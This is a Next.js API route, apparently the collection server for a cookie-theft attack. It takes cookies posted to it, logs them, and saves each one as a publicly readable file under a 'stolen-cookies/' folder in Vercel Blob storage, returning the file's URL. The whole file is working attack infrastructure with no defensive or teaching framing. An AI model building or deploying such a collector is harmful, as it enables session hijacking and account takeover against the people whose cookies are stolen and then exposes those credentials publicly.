import { NextResponse } from "next/server";
import { put } from "@vercel/blob";

export async function POST(req) {
  try {
    const { cookie } = await req.json();

    console.log("cookie", cookie);
    

    if (!cookie) {
      return NextResponse.json({ error: "No cookie provided" }, { status: 400 });
    }

    // Generate a unique filename based on timestamp
    const fileName = `stolen-cookies/${Date.now()}.txt`;

    // Save the cookie data
    const { url } = await put(fileName, cookie, { access: "public" });

    return NextResponse.json({ message: "Cookie saved", url });
  } catch (error) {
    console.error("Error saving cookie:", error);
    return NextResponse.json({ error: "Internal server error" }, { status: 500 });
  }
}
